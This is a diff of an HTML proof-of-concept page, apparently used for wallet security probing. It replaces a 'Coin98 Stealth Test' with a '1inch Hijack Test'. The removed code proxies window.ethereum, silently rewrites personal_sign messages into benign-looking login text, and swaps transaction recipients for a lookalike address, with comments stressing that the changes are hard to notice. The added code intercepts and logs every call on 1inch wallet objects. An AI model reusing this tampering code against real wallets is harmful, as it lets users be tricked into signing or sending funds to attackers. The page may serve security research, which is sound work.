@@ -1,263 +1,121 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
-    <title>Coin98 Stealth Provider Test v14</title>
-    <style>
-        * { box-sizing: border-box; }
-        body {
-            margin: 0; padding: 14px;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-            background: #0d0d0d; color: #e8e8e8; font-size: 13px;
-        }
-        h2 { color: #ff6b6b; margin: 0 0 4px 0; font-size: 17px; }
-        .sub { color: #999; font-size: 12px; margin-bottom: 12px; }
-        .btns { display: flex; flex-wrap: wrap; gap: 6px; margin-bottom: 10px; }
-        button {
-            background: #ff6b6b; color: #111; border: none;
-            padding: 9px 12px; border-radius: 8px; font-weight: 600; font-size: 12px;
-        }
-        button.secondary { background: #333; color: #eee; }
-        .toggle {
-            display: flex; align-items: center; gap: 8px;
-            margin: 8px 0 12px; font-size: 12px; color: #ccc;
-        }
-        .log-box {
-            background: #161616; border: 1px solid #2a2a2a; border-radius: 10px;
-            padding: 10px; max-height: 58vh; overflow-y: auto;
-            font-family: ui-monospace, "SF Mono", Menlo, monospace;
-            font-size: 11px; line-height: 1.4;
-        }
-        .log { margin: 4px 0; word-break: break-all; }
-        .red { color: #ff5252; font-weight: 600; }
-        .green { color: #69f0ae; }
-        .blue { color: #40c4ff; }
-        .orange { color: #ffab40; }
-        .gray { color: #888; }
-    </style>
+<meta charset="UTF-8">
+<title>1inch test </title>
+<style>
+  body { font-family: monospace; font-size: 12px; padding: 12px; background: #111; color: #eee; }
+  .log { margin: 3px 0; word-break: break-all; }
+  .red { color: #ff5555; font-weight: bold; }
+  .purple { color: #c084fc; }
+  .blue { color: #60a5fa; }
+  .green { color: #4ade80; }
+</style>
 </head>
 <body>
-    <h2>Coin98 Stealth Test v14</h2>
-    <div class="sub">Perubahan dibuat lebih sulit dikenali</div>
-
-    <div class="toggle">
-        <input type="checkbox" id="enableModify" checked>
-        <label for="enableModify">Aktifkan modifikasi stealth</label>
-    </div>
-
-    <div class="btns">
-        <button onclick="testAccounts()">1. Request Accounts</button>
-        <button onclick="testSign()">2. personal_sign</button>
-        <button onclick="testTx()">3. Send Transaction</button>
-        <button class="secondary" onclick="clearLogs()">Clear Log</button>
-    </div>
-
-    <div class="log-box" id="logs"></div>
+<h3 style="margin:0 0 8px 0; color:#fff">1inch Hijack Test v13</h3>
+<div style="color:#aaa; font-size:11px; margin-bottom:12px">Deep Callback & Property Hijacking POC...</div>
+<hr style="border-color:#333; margin:8px 0">
 
 <script>
-(function () {
-    const logsEl = document.getElementById('logs');
-    let proxied = false;
-    let userAddress = null;
+  // simple logger
+  function log(msg, cls = "") {
+    const d = document.createElement("div");
+    d.className = "log " + cls;
+    d.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
+    document.body.prepend(d);
+    console.log(msg);
+  }
 
-    function log(msg, cls = '') {
-        const time = new Date().toLocaleTimeString('id-ID', { hour12: false });
-        console.log(`[Stealth-v14] ${msg}`);
-        const div = document.createElement('div');
-        div.className = 'log ' + cls;
-        div.textContent = `[${time}] ${msg}`;
-        logsEl.prepend(div);
-    }
+  // deep trap pake Proxy
+  function applyDeepTrap(name) {
+    if (!window[name]) return;
 
-    function clearLogs() {
-        logsEl.innerHTML = '';
-    }
+    log(`[!] Found window.${name}. Applying deep trap...`, "purple");
 
-    function shouldModify() {
-        return document.getElementById('enableModify').checked;
-    }
+    const original = window[name];
 
-    // Membuat address yang mirip (lookalike)
-    function makeLookalike(addr) {
-        if (!addr || addr.length < 20) return addr;
-        // Ambil 6 karakter depan + 6 karakter belakang, tengah diganti
-        const start = addr.slice(0, 8);
-        const end = addr.slice(-6);
-        return start + 'a7f3c91e2b0d' + end;
-    }
+    try {
+      window[name] = new Proxy(original, {
+        get(target, prop, receiver) {
+          const val = Reflect.get(target, prop, receiver);
 
-    // Pesan personal_sign yang terlihat sangat normal
-    function createStealthMessage() {
-        const messages = [
-            "Sign this message to connect to the dApp.\nNonce: " + Date.now(),
-            "Welcome back! Please sign to continue.\nTimestamp: " + new Date().toISOString(),
-            "Sign-in request\nBy signing, you agree to the terms of use."
-        ];
-        const text = messages[Math.floor(Math.random() * messages.length)];
-        let hex = '0x';
-        for (let i = 0; i < text.length; i++) {
-            hex += text.charCodeAt(i).toString(16).padStart(2, '0');
-        }
-        return hex;
-    }
+          // trap function
+          if (typeof val === "function") {
+            return function (...args) {
+              log(`🚨 CALLED ${name}.${String(prop)}(...) -> Args: ${JSON.stringify(args)}`, "red");
+              return val.apply(this === receiver ? target : this, args);
+            };
+          }
 
-    function createProxy(original) {
-        return new Proxy(original, {
-            get(target, prop, receiver) {
-                const value = Reflect.get(target, prop, receiver);
-
-                if (prop === 'request' || prop === 'send' || prop === 'sendAsync') {
-                    return async function (...args) {
-                        const payload = args[0];
-                        const method = payload?.method || prop;
-
-                        log(`🚨 INTERCEPT → ${method}`, 'red');
-                        log(`   Original : ${JSON.stringify(payload).slice(0, 400)}`, 'orange');
-
-                        let finalPayload = payload;
-
-                        if (shouldModify() && payload && typeof payload === 'object') {
-                            try {
-                                const modified = JSON.parse(JSON.stringify(payload));
-
-                                // --- personal_sign (stealth) ---
-                                if (modified.method === 'personal_sign' && modified.params?.[0]) {
-                                    modified.params[0] = createStealthMessage();
-                                    log(`   ⚠️ STEALTH: personal_sign diubah ke pesan login yang terlihat normal`, 'red');
-                                }
-
-                                // --- eth_sendTransaction (stealth) ---
-                                if (modified.method === 'eth_sendTransaction' && modified.params?.[0]) {
-                                    const tx = modified.params[0];
-                                    const originalTo = tx.to;
-
-                                    if (userAddress) {
-                                        tx.to = makeLookalike(userAddress);
-                                        log(`   ⚠️ STEALTH: to diganti ke lookalike address`, 'red');
-                                        log(`      Asli  : ${originalTo}`, 'gray');
-                                        log(`      Baru  : ${tx.to}`, 'orange');
-                                    }
-                                }
-
-                                finalPayload = modified;
-                                log(`   Modified : ${JSON.stringify(finalPayload).slice(0, 400)}`, 'orange');
-                            } catch (e) {
-                                log(`   Modify error: ${e.message}`, 'red');
-                            }
-                        }
-
-                        try {
-                            const result = await value.apply(
-                                this === receiver ? target : this,
-                                [finalPayload, ...args.slice(1)]
-                            );
-                            const short = typeof result === 'string'
-                                ? result.slice(0, 66) + '...'
-                                : JSON.stringify(result).slice(0, 90);
-                            log(`   ✅ Result: ${short}`, 'green');
-                            return result;
-                        } catch (err) {
-                            log(`   ❌ Error: ${err.message || err}`, 'red');
-                            throw err;
-                        }
+          // trap nested object juga (biar lebih dalam)
+          if (val && typeof val === "object") {
+            try {
+              return new Proxy(val, {
+                get(t, p, r) {
+                  const v = Reflect.get(t, p, r);
+                  if (typeof v === "function") {
+                    return function (...a) {
+                      log(`🚨 CALLED ${name}.${String(prop)}.${String(p)}(...) -> Args: ${JSON.stringify(a)}`, "red");
+                      return v.apply(this, a);
                     };
+                  }
+                  return v;
                 }
+              });
+            } catch (e) {}
+          }
 
-                if (typeof value === 'function') return value.bind(target);
-                return value;
-            }
-        });
+          return val;
+        },
+
+        set(target, prop, value) {
+          log(`[SET] ${name}.${String(prop)} = ${value}`, "blue");
+          return Reflect.set(target, prop, value);
+        }
+      });
+
+      log(`[+] Initializing Deep Callback Interceptor v13...`, "blue");
+    } catch (err) {
+      log(`[x] gagal trap ${name}: ${err.message}`, "red");
     }
+  }
 
-    function applyProxy() {
-        if (!window.ethereum) {
-            log('[-] window.ethereum belum tersedia', 'orange');
-            return false;
-        }
-        if (proxied) return true;
-
-        try {
-            window.ethereum = createProxy(window.ethereum);
-            proxied = true;
-            log('[+] Successfully proxied window.ethereum', 'green');
-            return true;
-        } catch (e) {
-            log(`[!] Gagal proxy: ${e.message}`, 'red');
-            return false;
-        }
+  // coba intercept defineProperty juga (kadang wallet inject belakangan)
+  const _defineProperty = Object.defineProperty;
+  Object.defineProperty = function (obj, prop, desc) {
+    if (obj === window && (prop === "OneInchIOSWallet" || prop === "OneInchSolanaWallet")) {
+      log(`[!] window.${prop} lagi di-define...`, "red");
     }
+    return _defineProperty.apply(this, arguments);
+  };
 
-    function boot() {
-        log('Coin98 Stealth Test v14 loaded', 'green');
-        applyProxy();
-        setTimeout(applyProxy, 400);
-        setTimeout(applyProxy, 1200);
-        setTimeout(applyProxy, 2500);
-    }
-
-    window.addEventListener('load', boot);
-    window.addEventListener('ethereum#initialized', () => {
-        log('[*] ethereum#initialized event', 'blue');
-        applyProxy();
-    }, { once: true });
-
-    // ===== Test Functions =====
-    window.testAccounts = async function () {
-        try {
-            const accs = await window.ethereum.request({ method: 'eth_requestAccounts' });
-            userAddress = accs?.[0] || null;
-            log('Accounts: ' + JSON.stringify(accs), 'green');
-        } catch (e) {
-            log('Error: ' + (e.message || e), 'red');
-        }
-    };
-
-    window.testSign = async function () {
-        try {
-            const accs = await window.ethereum.request({ method: 'eth_accounts' });
-            if (!accs?.[0]) return log('Tidak ada account', 'red');
-            userAddress = accs[0];
-
-            // Kirim pesan asli yang sederhana
-            const originalMsg = '0x48656c6c6f20436f696e3938'; // "Hello Coin98"
-            log('Mengirim personal_sign...', 'blue');
-
-            const sig = await window.ethereum.request({
-                method: 'personal_sign',
-                params: [originalMsg, accs[0]]
-            });
-            log('Signature: ' + sig, 'green');
-        } catch (e) {
-            log('Error: ' + (e.message || e), 'red');
-        }
-    };
-
-    window.testTx = async function () {
-        try {
-            const accs = await window.ethereum.request({ method: 'eth_accounts' });
-            if (!accs?.[0]) return log('Tidak ada account', 'red');
-            userAddress = accs[0];
-
-            log('Mengirim eth_sendTransaction...', 'blue');
-
-            const txHash = await window.ethereum.request({
-                method: 'eth_sendTransaction',
-                params: [{
-                    from: accs[0],
-                    to: accs[0],
-                    value: '0x0',
-                    data: '0x'
-                }]
-            });
-            log('Tx Hash: ' + txHash, 'green');
-        } catch (e) {
-            log('Error: ' + (e.message || e), 'red');
-        }
-    };
-
-    window.clearLogs = clearLogs;
-})();
+  // jalanin setelah page load
+  window.addEventListener("load", () => {
+    log("1inch Full Coverage Test v13 Loaded");
+    
+    // kasih jeda dikit biar object wallet sempet inject
+    setTimeout(() => {
+      applyDeepTrap("OneInchSolanaWallet");
+      applyDeepTrap("OneInchIOSWallet");
+      
+      // coba lagi beberapa kali soalnya kadang object muncul belakangan
+      let tries = 0;
+      const interval = setInterval(() => {
+        tries++;
+        applyDeepTrap("OneInchSolanaWallet");
+        applyDeepTrap("OneInchIOSWallet");
+        if (tries > 8) clearInterval(interval);
+      }, 600);
+    }, 250);
+  });
 </script>
+
+<div style="margin-top:20px; color:#666; font-size:11px; line-height:1.5">
+  <b>Instruksi Pengujian :</b><br>
+  1. Buka halaman ini di dApp browser 1inch.<br>
+  2. Lakukan proses Swap atau panggil fungsi transaksi/signing.<br>
+  3. Perhatikan apakah ada log merah baru yang mencetak fungsi turunan (seperti *exec*callback* dll).
+</div>
 </body>
 </html>
